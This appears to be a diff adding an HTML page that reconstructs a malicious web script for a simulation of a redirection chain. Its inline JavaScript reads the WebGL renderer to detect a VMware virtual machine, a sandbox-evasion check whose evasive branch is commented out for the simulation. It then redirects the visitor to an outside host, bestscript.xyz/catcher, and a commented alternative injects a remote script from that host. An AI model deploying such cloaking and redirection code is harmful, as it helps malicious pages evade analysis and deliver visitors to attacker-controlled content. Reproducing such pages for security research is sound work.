@@ -1,0 +1,26 @@
+<html>
+    <script>
+        /* Identify if in virtual machine = = */
+        var canvas = document.createElement('canvas');
+        var gl = canvas.getContext('webgl');
+
+        var debugInfo = gl.getExtension('WEBGL_debug_renderer_info')
+        var vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)
+        var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+        /*:vendor: will be the provider of the renderer. (eg. VMware, .Inc in Virtual Machine)*/
+        if(vendor == "VMware, .Inc"){
+            //document.location = 'https://google.com'
+            /*If we detect vmware, navigated back to google. However, in our 'all VM' simulation case, we ignore it.*/
+        }
+        var sc = document.createElement('script');
+        document.location = `https://www.bestscript.xyz/catcher?id=${Math.floor(Math.random() * 10000000000)}`;
+
+        /*
+        The original content of the script. However, in bestscript.xyz, you map the url to `2_redirection.html`. 
+        So I change the code below to code in line 16. You can modify it feel free
+        */
+       
+        //sc.src = `https://www.bestscript.xyz/catcher?id=${Math.floor(Math.random() * 10000000000)}`;
+        //document.head.appendChild(sc);
+    </script>
+</html>
